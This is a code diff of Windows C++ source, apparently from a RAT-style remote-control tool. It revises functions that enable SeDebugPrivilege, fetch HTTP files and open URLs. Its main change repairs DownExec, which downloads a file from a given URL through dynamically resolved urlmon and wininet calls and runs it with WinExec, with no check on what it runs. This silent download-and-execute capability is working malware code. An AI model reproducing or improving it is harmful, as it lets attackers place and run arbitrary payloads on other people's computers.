@@ -70,7 +70,7 @@ int GrantPrivilege()
     return SetPrivilege(SE_DEBUG_NAME);
 }
 
-char* GetHttpFile(char Url[])
+char* GetHttpFile(const char Url[])
 {
     HMODULE hDll;
     LPVOID hInternet, hUrlHandle;
@@ -108,7 +108,7 @@ char* GetHttpFile(char Url[])
         return NULL;
 }
 
-void DownExec(char url[])
+void DownExec(const char url[])
 {
     HMODULE hurlmon, hwininet;
 
@@ -119,26 +119,19 @@ void DownExec(char url[])
     BOOL(WINAPI * CACHEINFO) (LPCSTR, LPINTERNET_CACHE_ENTRY_INFO, LPDWORD);
     (FARPROC&)DOWNFILE = GetProcAddress(hurlmon, "URLDownloadToCacheFileA");
     (FARPROC&)CACHEINFO = GetProcAddress(hwininet, "GetUrlCacheEntryInfoA");
-
-    DOWNFILE(NULL, url, "c:\\1.exe", 10, 0, NULL);
+	// 用于保存缓存文件路径
+	char szFileName[MAX_PATH] = { 0 };
+    DOWNFILE(NULL, url, szFileName, sizeof(szFileName), 0, NULL);
 
     DWORD dwEntrySize = 0;
-    LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry;
-    char strTemp[255];
     if (!CACHEINFO(url, NULL, &dwEntrySize)) {
-        lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)new char[dwEntrySize];
-        if (CACHEINFO(url, lpCacheEntry, &dwEntrySize)) {
-            ZeroMemory(strTemp, 255);
-            lstrcpyn(strTemp, lpCacheEntry->lpszLocalFileName, strlen(lpCacheEntry->lpszLocalFileName));
-
-            WinExec(strTemp, SW_SHOW);
-        }
+		WinExec(szFileName, SW_SHOW);
     }
     FreeLibrary(hurlmon);
     FreeLibrary(hwininet);
 }
 
-void OpenUrl(char url[])
+void OpenUrl(const char url[])
 {
     HMODULE hshell;
     hshell = LoadLibraryW(L"Shell32.dll");
